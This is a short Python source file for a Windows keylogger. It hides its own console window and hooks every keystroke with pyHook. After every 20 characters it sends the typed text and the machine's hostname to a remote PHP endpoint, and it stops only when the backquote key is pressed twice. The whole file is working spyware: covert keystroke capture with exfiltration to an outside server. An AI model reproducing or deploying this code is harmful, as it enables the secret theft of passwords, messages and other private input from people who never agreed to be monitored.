import pythoncom, pyHook
import platform
import requests
import sys
import win32api
import win32console
import win32gui
from thread import start_new_thread

# Get the console windows and hiding it
# so the app runs in the background
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

# flag is to check whether `` is pressed twice
flag = 0
wbuffer = ''
hostname = platform.node()

#creating a payload and sending it to the server
def postRequest(param):
  global hostname
  payload = {'word' : param, 'hostname' : hostname}
  r = requests.post('http://sreenathsdas.16mb.com/kl/post.php',data=payload)
  print r.status_code, r.text

def OnKeyboardEvent(event):
  global flag
  global wbuffer
  
  # logging is is stopped when back quote (`) is pressed twice
  if event.Ascii == 96 :
    flag += 1
    if flag > 1:
      if wbuffer:
        postRequest(wbuffer)
        #print 'posted ',wbuffer
      sys.exit()
      
  if event.Ascii != 0 or 8:
    if event.Ascii == 13:
      key = "_____"
    else:
      key = chr(event.Ascii)

    wbuffer += key
    #print '>>', wbuffer
    
    #Logs the data once the user has pressed 20 characters
    if len(wbuffer) >= 20:
      start_new_thread(postRequest, (wbuffer,))
      #print 'posted ', wbuffer
      wbuffer = ''

#creating a hook object
hm = pyHook.HookManager()

#hooking the key event with our function OnKeyboardEvent
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard() 

# pumps the windows messages to the main thread in an infinite loop
pythoncom.PumpMessages()